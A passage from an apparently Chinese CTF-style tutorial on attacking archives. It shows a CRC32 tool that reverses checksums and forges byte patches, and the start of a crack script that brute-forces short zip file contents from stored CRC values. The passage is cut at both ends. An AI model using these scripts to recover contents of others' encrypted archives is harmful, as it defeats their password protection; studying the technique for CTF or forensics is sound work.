class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># CRC32 tools by Victor</span></div><div class="line"><span class="comment">#usage: python crc32.py reverse 0xffffffff（the crc）</span></div><div class="line"><span class="keyword">import</span> argparse</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">permitted_characters = set(</div><div class="line">    map(ord, <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_'</span>))  <span class="comment"># \w</span></div><div class="line">testing = <span class="keyword">False</span></div><div class="line">args = <span class="keyword">None</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_poly</span><span class="params">()</span>:</span></div><div class="line">    poly = parse_dword(args.poly)</div><div class="line">    <span class="keyword">if</span> args.msb:</div><div class="line">        poly = reverseBits(poly)</div><div class="line">    check32(poly)</div><div class="line">    <span class="keyword">return</span> poly</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> args.instr:</div><div class="line">        <span class="keyword">return</span> tuple(map(ord, args.instr))</div><div class="line">    <span class="keyword">with</span> args.infile <span class="keyword">as</span> f:  <span class="comment"># pragma: no cover</span></div><div class="line">        <span class="keyword">return</span> tuple(map(ord, f.read()))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(msg)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> testing:  <span class="comment"># pragma: no cover</span></div><div class="line">        args.outfile.write(msg)</div><div class="line">        args.outfile.write(os.linesep)</div><div class="line">table = []</div><div class="line">table_reverse = []</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_tables</span><span class="params">(poly, reverse=True)</span>:</span></div><div class="line">    <span class="keyword">global</span> table, table_reverse</div><div class="line">    table = []</div><div class="line">    <span class="comment"># build CRC32 table</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> i &amp; <span class="number">1</span>:</div><div class="line">                i &gt;&gt;= <span class="number">1</span></div><div class="line">                i ^= poly</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                i &gt;&gt;= <span class="number">1</span></div><div class="line">        table.append(i)</div><div class="line">    <span class="keyword">assert</span> len(table) == <span class="number">256</span>, <span class="string">"table is wrong size"</span></div><div class="line">    <span class="comment"># build reverse table</span></div><div class="line">    <span class="keyword">if</span> reverse:</div><div class="line">        table_reverse = []</div><div class="line">        found_none = set()</div><div class="line">        found_multiple = set()</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">            found = []</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">                <span class="keyword">if</span> table[j] &gt;&gt; <span class="number">24</span> == i:</div><div class="line">                    found.append(j)</div><div class="line">            table_reverse.append(tuple(found))</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found:</div><div class="line">                found_none.add(i)</div><div class="line">            <span class="keyword">elif</span> len(found) &gt; <span class="number">1</span>:</div><div class="line">                found_multiple.add(i)</div><div class="line">        <span class="keyword">assert</span> len(table_reverse) == <span class="number">256</span>, <span class="string">"reverse table is wrong size"</span></div><div class="line">        <span class="keyword">if</span> found_multiple:</div><div class="line">            out(<span class="string">'WARNING: Multiple table entries have an MSB in &#123;0&#125;'</span>.format(</div><div class="line">                rangess(found_multiple)))</div><div class="line">        <span class="keyword">if</span> found_none:</div><div class="line">            out(<span class="string">'ERROR: no MSB in the table equals bytes in &#123;0&#125;'</span>.format(</div><div class="line">                rangess(found_none)))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(data, accum=<span class="number">0</span>)</span>:</span></div><div class="line">    accum = ~accum</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</div><div class="line">        accum = table[(accum ^ b) &amp; <span class="number">0xFF</span>] ^ ((accum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>)</div><div class="line">    accum = ~accum</div><div class="line">    <span class="keyword">return</span> accum &amp; <span class="number">0xFFFFFFFF</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rewind</span><span class="params">(accum, data)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> (accum,)</div><div class="line">    stack = [(len(data), ~accum)]</div><div class="line">    solutions = set()</div><div class="line">    <span class="keyword">while</span> stack:</div><div class="line">        node = stack.pop()</div><div class="line">        prev_offset = node[<span class="number">0</span>] - <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> table_reverse[(node[<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:</div><div class="line">            prevCRC = (((node[<span class="number">1</span>] ^ table[i]) &lt;&lt; <span class="number">8</span>) |</div><div class="line">                       (i ^ data[prev_offset])) &amp; <span class="number">0xFFFFFFFF</span></div><div class="line">            <span class="keyword">if</span> prev_offset:</div><div class="line">                stack.append((prev_offset, prevCRC))</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                solutions.add((~prevCRC) &amp; <span class="number">0xFFFFFFFF</span>)</div><div class="line">    <span class="keyword">return</span> solutions</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findReverse</span><span class="params">(desired, accum)</span>:</span></div><div class="line">    solutions = set()</div><div class="line">    accum = ~accum</div><div class="line">    stack = [(~desired,)]</div><div class="line">    <span class="keyword">while</span> stack:</div><div class="line">        node = stack.pop()</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table_reverse[(node[<span class="number">0</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:</div><div class="line">            <span class="keyword">if</span> len(node) == <span class="number">4</span>:</div><div class="line">                a = accum</div><div class="line">                data = []</div><div class="line">                node = node[<span class="number">1</span>:] + (j,)</div><div class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</div><div class="line">                    data.append((a ^ node[i]) &amp; <span class="number">0xFF</span>)</div><div class="line">                    a &gt;&gt;= <span class="number">8</span></div><div class="line">                    a ^= table[node[i]]</div><div class="line">                solutions.add(tuple(data))</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                stack.append(((node[<span class="number">0</span>] ^ table[j]) &lt;&lt; <span class="number">8</span>,) + node[<span class="number">1</span>:] + (j,))</div><div class="line">    <span class="keyword">return</span> solutions</div><div class="line"><span class="comment"># Tools</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dword</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> int(x, <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverseBits</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="comment"># http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel</span></div><div class="line">    <span class="comment"># http://stackoverflow.com/a/20918545</span></div><div class="line">    x = ((x &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span>) | ((x &amp; <span class="number">0xAAAAAAAA</span>) &gt;&gt; <span class="number">1</span>)</div><div class="line">    x = ((x &amp; <span class="number">0x33333333</span>) &lt;&lt; <span class="number">2</span>) | ((x &amp; <span class="number">0xCCCCCCCC</span>) &gt;&gt; <span class="number">2</span>)</div><div class="line">    x = ((x &amp; <span class="number">0x0F0F0F0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &amp; <span class="number">0xF0F0F0F0</span>) &gt;&gt; <span class="number">4</span>)</div><div class="line">    x = ((x &amp; <span class="number">0x00FF00FF</span>) &lt;&lt; <span class="number">8</span>) | ((x &amp; <span class="number">0xFF00FF00</span>) &gt;&gt; <span class="number">8</span>)</div><div class="line">    x = ((x &amp; <span class="number">0x0000FFFF</span>) &lt;&lt; <span class="number">16</span>) | ((x &amp; <span class="number">0xFFFF0000</span>) &gt;&gt; <span class="number">16</span>)</div><div class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></div><div class="line"><span class="comment"># Compatibility with Python 2.6 and earlier.</span></div><div class="line"><span class="keyword">if</span> hasattr(int, <span class="string">"bit_length"</span>):</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(num)</span>:</span></div><div class="line">        <span class="keyword">return</span> num.bit_length()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(n)</span>:</span></div><div class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        bits = <span class="number">-32</span></div><div class="line">        m = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> n:</div><div class="line">            m = n</div><div class="line">            n &gt;&gt;= <span class="number">32</span></div><div class="line">            bits += <span class="number">32</span></div><div class="line">        <span class="keyword">while</span> m:</div><div class="line">            m &gt;&gt;= <span class="number">1</span></div><div class="line">            bits += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> bits</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check32</span><span class="params">(poly)</span>:</span></div><div class="line">    <span class="keyword">if</span> poly &amp; <span class="number">0x80000000</span> == <span class="number">0</span>:</div><div class="line">        out(<span class="string">'WARNING: polynomial degree (&#123;0&#125;) != 32'</span>.format(bit_length(poly)))</div><div class="line">        out(<span class="string">'         instead, try'</span>)</div><div class="line">        out(<span class="string">'         0x&#123;0:08x&#125; (reversed/lsbit-first)'</span>.format(poly | <span class="number">0x80000000</span>))</div><div class="line">        out(<span class="string">'         0x&#123;0:08x&#125; (normal/msbit-first)'</span>.format(reverseBits(poly | <span class="number">0x80000000</span>)))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reciprocal</span><span class="params">(poly)</span>:</span></div><div class="line">    <span class="string">''' Return the reversed reciprocal (Koopman notatation) polynomial of a</span></div><div class="line">        reversed (lsbit-first) polynomial '''</div><div class="line">    <span class="keyword">return</span> reverseBits((poly &lt;&lt; <span class="number">1</span>) | <span class="number">1</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_num</span><span class="params">(num)</span>:</span></div><div class="line">    <span class="string">''' Write a numeric result in various forms '''</span></div><div class="line">    out(<span class="string">'hex: 0x&#123;0:08x&#125;'</span>.format(num))</div><div class="line">    out(<span class="string">'dec:   &#123;0:d&#125;'</span>.format(num))</div><div class="line">    out(<span class="string">'oct: 0o&#123;0:011o&#125;'</span>.format(num))</div><div class="line">    out(<span class="string">'bin: 0b&#123;0:032b&#125;'</span>.format(num))</div><div class="line"><span class="keyword">import</span> itertools</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranges</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="keyword">for</span> kg <span class="keyword">in</span> itertools.groupby(enumerate(i), <span class="keyword">lambda</span> x: x[<span class="number">1</span>] - x[<span class="number">0</span>]):</div><div class="line">        g = list(kg[<span class="number">1</span>])</div><div class="line">        <span class="keyword">yield</span> g[<span class="number">0</span>][<span class="number">1</span>], g[<span class="number">-1</span>][<span class="number">1</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rangess</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">', '</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'[&#123;0&#125;,&#123;1&#125;]'</span>.format(*x), ranges(i)))</div><div class="line"><span class="comment"># Parsers</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parser</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">''' Return the command-line parser '''</span></div><div class="line">    parser = argparse.ArgumentParser(</div><div class="line">        description=<span class="string">"Reverse, undo, and calculate CRC32 checksums"</span>)</div><div class="line">    subparsers = parser.add_subparsers(metavar=<span class="string">'action'</span>)</div><div class="line">    poly_flip_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    subparser_group = poly_flip_parser.add_mutually_exclusive_group()</div><div class="line">    subparser_group.add_argument(</div><div class="line">        <span class="string">'-m'</span>, <span class="string">'--msbit'</span>, dest=<span class="string">"msb"</span>, action=<span class="string">'store_true'</span>,</div><div class="line">        help=<span class="string">'treat the polynomial as normal (msbit-first)'</span>)</div><div class="line">    subparser_group.add_argument(<span class="string">'-l'</span>, <span class="string">'--lsbit'</span>, action=<span class="string">'store_false'</span>,</div><div class="line">                                 help=<span class="string">'treat the polynomial as reversed (lsbit-first) [default]'</span>)</div><div class="line">    desired_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    desired_poly_parser.add_argument(</div><div class="line">        <span class="string">'desired'</span>, type=str, help=<span class="string">'[int] desired checksum'</span>)</div><div class="line">    default_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    default_poly_parser.add_argument(</div><div class="line">        <span class="string">'poly'</span>, default=<span class="string">'0xEDB88320'</span>, type=str, nargs=<span class="string">'?'</span>,</div><div class="line">        help=<span class="string">'[int] polynomial [default: 0xEDB88320]'</span>)</div><div class="line">    accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    accum_parser.add_argument(</div><div class="line">        <span class="string">'accum'</span>, type=str, help=<span class="string">'[int] accumulator (final checksum)'</span>)</div><div class="line">    default_accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    default_accum_parser.add_argument(</div><div class="line">        <span class="string">'accum'</span>, default=<span class="string">'0'</span>, type=str, nargs=<span class="string">'?'</span>,</div><div class="line">        help=<span class="string">'[int] starting accumulator [default: 0]'</span>)</div><div class="line">    outfile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    outfile_parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>,</div><div class="line">                                metavar=<span class="string">"f"</span>,</div><div class="line">                                type=argparse.FileType(<span class="string">'w'</span>),</div><div class="line">                                default=sys.stdout,</div><div class="line">                                help=<span class="string">"Output to a file instead of stdout"</span>)</div><div class="line">    infile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</div><div class="line">    subparser_group = infile_parser.add_mutually_exclusive_group()</div><div class="line">    subparser_group.add_argument(<span class="string">'-i'</span>, <span class="string">'--infile'</span>,</div><div class="line">                                 metavar=<span class="string">"f"</span>,</div><div class="line">                                 type=argparse.FileType(<span class="string">'rb'</span>),</div><div class="line">                                 default=sys.stdin,</div><div class="line">                                 help=<span class="string">"Input from a file instead of stdin"</span>)</div><div class="line">    subparser_group.add_argument(<span class="string">'-s'</span>, <span class="string">'--str'</span>,</div><div class="line">                                 metavar=<span class="string">"s"</span>,</div><div class="line">                                 type=str,</div><div class="line">                                 default=<span class="string">''</span>,</div><div class="line">                                 dest=<span class="string">'instr'</span>,</div><div class="line">                                 help=<span class="string">"Use a string as input"</span>)</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'flip'</span>, parents=[outfile_parser],</div><div class="line">                                      help=<span class="string">"flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa"</span>)</div><div class="line">    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)</div><div class="line">    subparser.set_defaults(</div><div class="line">        func=<span class="keyword">lambda</span>: print_num(reverseBits(parse_dword(args.poly))))</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'reciprocal'</span>, parents=[outfile_parser],</div><div class="line">                                      help=<span class="string">"find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa"</span>)</div><div class="line">    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)</div><div class="line">    subparser.set_defaults(func=reciprocal_callback)</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'table'</span>, parents=[outfile_parser,</div><div class="line">                                                        poly_flip_parser,</div><div class="line">                                                        default_poly_parser],</div><div class="line">                                      help=<span class="string">"generate a lookup table for a polynomial"</span>)</div><div class="line">    subparser.set_defaults(func=table_callback)</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'reverse'</span>, parents=[</div><div class="line">        outfile_parser,</div><div class="line">        poly_flip_parser,</div><div class="line">        desired_poly_parser,</div><div class="line">        default_accum_parser,</div><div class="line">        default_poly_parser],</div><div class="line">        help=<span class="string">"find a patch that causes the CRC32 checksum to become a desired value"</span>)</div><div class="line">    subparser.set_defaults(func=reverse_callback)</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'undo'</span>, parents=[</div><div class="line">        outfile_parser,</div><div class="line">        poly_flip_parser,</div><div class="line">        accum_parser,</div><div class="line">        default_poly_parser,</div><div class="line">        infile_parser],</div><div class="line">        help=<span class="string">"rewind a CRC32 checksum"</span>)</div><div class="line">    subparser.add_argument(<span class="string">'-n'</span>, <span class="string">'--len'</span>, metavar=<span class="string">'l'</span>, type=str,</div><div class="line">                           default=<span class="string">'0'</span>, help=<span class="string">'[int] number of bytes to rewind [default: 0]'</span>)</div><div class="line">    subparser.set_defaults(func=undo_callback)</div><div class="line">    subparser = subparsers.add_parser(<span class="string">'calc'</span>, parents=[</div><div class="line">        outfile_parser,</div><div class="line">        poly_flip_parser,</div><div class="line">        default_accum_parser,</div><div class="line">        default_poly_parser,</div><div class="line">        infile_parser],</div><div class="line">        help=<span class="string">"calculate the CRC32 checksum"</span>)</div><div class="line">    subparser.set_defaults(func=calc_callback)</div><div class="line">    <span class="keyword">return</span> parser</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reciprocal_callback</span><span class="params">()</span>:</span></div><div class="line">    poly = parse_dword(args.poly)</div><div class="line">    check32(poly)</div><div class="line">    print_num(reciprocal(poly))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_callback</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># initialize tables</span></div><div class="line">    init_tables(get_poly(), <span class="keyword">False</span>)</div><div class="line">    <span class="comment"># print table</span></div><div class="line">    out(<span class="string">'[&#123;0&#125;]'</span>.format(<span class="string">', '</span>.join(map(<span class="string">'0x&#123;0:08x&#125;'</span>.format, table))))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_callback</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># initialize tables</span></div><div class="line">    init_tables(get_poly())</div><div class="line">    <span class="comment"># find reverse bytes</span></div><div class="line">    desired = parse_dword(args.desired)</div><div class="line">    accum = parse_dword(args.accum)</div><div class="line">    <span class="comment"># 4-byte patch</span></div><div class="line">    patches = findReverse(desired, accum)</div><div class="line">    <span class="keyword">for</span> patch <span class="keyword">in</span> patches:</div><div class="line">        out(<span class="string">'4 bytes: &#123;&#123;0x&#123;0:02x&#125;, 0x&#123;1:02x&#125;, 0x&#123;2:02x&#125;, 0x&#123;3:02x&#125;&#125;&#125;'</span>.format(*patch))</div><div class="line">        checksum = calc(patch, accum)</div><div class="line">        out(<span class="string">'verification checksum: 0x&#123;0:08x&#125; (&#123;1&#125;)'</span>.format(</div><div class="line">            checksum, <span class="string">'OK'</span> <span class="keyword">if</span> checksum == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>))</div><div class="line">    <span class="comment"># 6-byte alphanumeric patches</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permitted_characters:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> permitted_characters:</div><div class="line">            patch = [i, j]</div><div class="line">            patches = findReverse(desired, calc(patch, accum))</div><div class="line">            <span class="keyword">for</span> last_4_bytes <span class="keyword">in</span> patches:</div><div class="line">                <span class="keyword">if</span> all(p <span class="keyword">in</span> permitted_characters <span class="keyword">for</span> p <span class="keyword">in</span> last_4_bytes):</div><div class="line">                    patch.extend(last_4_bytes)</div><div class="line">                    out(<span class="string">'alternative: &#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125; (&#123;0&#125;)'</span>.format(</div><div class="line">                        <span class="string">'OK'</span> <span class="keyword">if</span> calc(patch, accum) == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>, *map(chr, patch)))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_callback</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># initialize tables</span></div><div class="line">    init_tables(get_poly())</div><div class="line">    <span class="comment"># calculate checksum</span></div><div class="line">    accum = parse_dword(args.accum)</div><div class="line">    maxlen = int(args.len, <span class="number">0</span>)</div><div class="line">    data = get_input()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; maxlen &lt;= len(data):</div><div class="line">        maxlen = len(data)</div><div class="line">    out(<span class="string">'rewinded &#123;0&#125;/&#123;1&#125; (&#123;2:.2f&#125;%)'</span>.format(maxlen, len(data),</div><div class="line">        maxlen * <span class="number">100.0</span> / len(data) <span class="keyword">if</span> len(data) <span class="keyword">else</span> <span class="number">100</span>))</div><div class="line">    <span class="keyword">for</span> solution <span class="keyword">in</span> rewind(accum, data[-maxlen:]):</div><div class="line">        out(<span class="string">''</span>)</div><div class="line">        print_num(solution)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_callback</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># initialize tables</span></div><div class="line">    init_tables(get_poly(), <span class="keyword">False</span>)</div><div class="line">    <span class="comment"># calculate checksum</span></div><div class="line">    accum = parse_dword(args.accum)</div><div class="line">    data = get_input()</div><div class="line">    out(<span class="string">'data len: &#123;0&#125;'</span>.format(len(data)))</div><div class="line">    out(<span class="string">''</span>)</div><div class="line">    print_num(calc(data, accum))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv=None)</span>:</span></div><div class="line">    <span class="string">''' Runs the program and handles command line options '''</span></div><div class="line">    parser = get_parser()</div><div class="line">    <span class="comment"># Parse arguments and run the function</span></div><div class="line">    <span class="keyword">global</span> args</div><div class="line">    args = parser.parse_args(argv)</div><div class="line">    args.func()</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()  <span class="comment"># pragma: no cover</span></div></pre></td></tr></table></figure>
<p>示例：</p>
<p><img src="/2017/10/19/rar-attack/9.png" alt=""></p>
<p>当字节数小于6时，用下面的crack.py脚本（用python3）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> collections</div><div class="line"><span class="keyword">import</span> argparse</div><div class="line">parser = argparse.ArgumentParser()</div><div class="line">parser.add_argument(<span class="string">'file'</span>, nargs=<span class="string">'*'</span>)</div><div class="line">parser.add_argument(<span class="string">'--hex'</span>, action=<span class="string">'append'</span>)</div><div class="line">parser.add_argument(<span class="string">'--dec'</span>, action=<span class="string">'append'</span>)</div><div class="line">parser.add_argument(<span class="string">'--limit'</span>, type=int)</div><div class="line">parser.add_argument(<span class="string">'--compiler'</span>, default=<span class="string">'g++'</span>)</div><div class="line">parser.add_argument(<span class="string">'--alphabet'</span>, type=os.fsencode, default=string.printable.encode())</div><div class="line">args = parser.parse_args()</div><div class="line">targets = collections.OrderedDict()</div><div class="line">limit = <span class="number">0</span></div><div class="line">crcs = []</div><div class="line"><span class="keyword">if</span> args.limit:</div><div class="line">    limit = max(limit, args.limit)</div><div class="line"><span class="keyword">if</span> args.hex <span class="keyword">or</span> args.dec:</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.limit:</div><div class="line">        parser.error(<span class="string">'Limit of length not specified'</span>)</div><div class="line"><span class="keyword">if</span> args.hex:</div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.hex:</div><div class="line">        crc = int(s, <span class="number">16</span>)</div><div class="line">        targets[s] = crc</div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</div><div class="line">            crcs += [( crc, l )]</div><div class="line"><span class="keyword">if</span> args.dec:</div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.dec:</div><div class="line">        crc = int(s)</div><div class="line">        targets[s] = crc</div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</div><div class="line">            crcs += [( crc, l )]</div><div class="line"><span class="keyword">if</span> args.file:</div><div class="line">    print(<span class="string">'reading zip files...'</span>, file=sys.stderr)</div><div class="line">    <span class="keyword">import</span> zipfile</div><div class="line">    <span class="keyword">for</span> zipname <span class="keyword">in</span> args.file:</div><div class="line">        fh = zipfile.ZipFile(zipname)</div><div class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> fh.infolist():</div><div class="line">            targets[<span class="string">'%s / %s'</span> % 